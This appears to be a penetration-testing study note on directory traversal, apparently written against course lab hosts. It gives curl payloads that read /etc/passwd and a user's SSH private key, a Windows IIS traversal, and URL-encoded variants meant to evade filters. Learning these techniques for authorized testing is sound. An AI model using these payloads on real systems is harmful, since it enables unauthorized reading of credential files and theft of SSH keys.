## Directory Traversal

Use `../` to navigate 1 directory backward from your current directory. If you string them together and use `cat`, you can go to root and navigate from there:

```bash
cat ../../../../../../../../../../../etc/passwd
```

### Identifying and Exploiting Directory Traversals
On Linux, `/var/www/html/` is often used as the web root. 

To start identifying all the potential directory traversals, first find all the URLS on a webpage by hovering over all buttons and links.

To make this easier, run this in the browser console on the website. It will display the URL, anchor text and whether the URL refers to an external website:
```JavaScript
const results = [
    ['Url', 'Anchor Text', 'External']
];
var urls = document.getElementsByTagName('a');
for (urlIndex in urls) {
    const url = urls[urlIndex]
    const externalLink = url.host !== window.location.host
    if(url.href && url.href.indexOf('://')!==-1) results.push([url.href, url.text, externalLink]) // url.rel
}
const csvContent = results.map((line)=>{
    return line.map((cell)=>{
        if(typeof(cell)==='boolean') return cell ? 'TRUE': 'FALSE'
        if(!cell) return ''
        let value = cell.replace(/[\f\n\v]*\n\s*/g, "\n").replace(/[\t\f ]+/g, ' ');
        value = value.replace(/\t/g, ' ').trim();
        return `"${value}"`
    }).join('\t')
}).join("\n");
console.log(csvContent)
```

Example:

URL: `http://mountaindesserts.com/meteor/index.php?page=admin.php`

You can see this uses PHP and a parameter called "page". This is probably used to display different pages too, e.g. "page=login.php". 

PHP uses _$_GET_ to manage variables via a GET request

For the above example, the URL displays a parameter and a value. Try the value as a path, and maybe you see the same page! This indicates that the web application includes information from the "page" parameter and shows it under the "admin" link. I.e. the `page=` parameter takes input and displays it. Normally, this would be a webpage file, but you can use this to navigate the directories! E.g.:

`http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd`

To display list of users.

Can potentially be used to display SSH private key and then connect using this key, e.g.:
```bash
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
```

#### Windows
Instead of /etc/passwd, default is C:\Windows\System32\drivers\etc\hosts, since it is readable by all users.

More difficult, since no equivalent to /etc/passwd means no user list and no indication of where to check for SSH keys.

For IIS servers, always check:
- C:\inetpub\logs\LogFiles\W3SVC1\
- C:\inetpub\wwwroot\web.config
- Documentation of IIS to see whether there are any other potentially useful files.

For Windows IIS, it the "payload" **usuallly** does not change, e.g. to \.
```bash
curl --path-as-is 192.168.202.193:3000/public/plugins/alertlist/../../../../../../../../../../../../../../../../../Users/install.txt -v
```
Worked to display file located in C:\Users\install.txt


### Encoding Special Characters

Because `../` is a known way to abuse web applications, it is often filtered. We can use URL encoding/percent encoding to bypass this. Specifically: ASCII encoding: https://www.w3schools.com/tags/ref_urlencode.asp


| Character | From Windows 1252 | From UTF-8 |
| ----------|-------------------|------------|
| . | %2E |	%2E |
| /	| %2F |	%2F |

E.g.:
```bash
curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```
or
```bash
curl http://192.168.50.16/cgi-bin/%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2Fetc%2Fpasswd
```
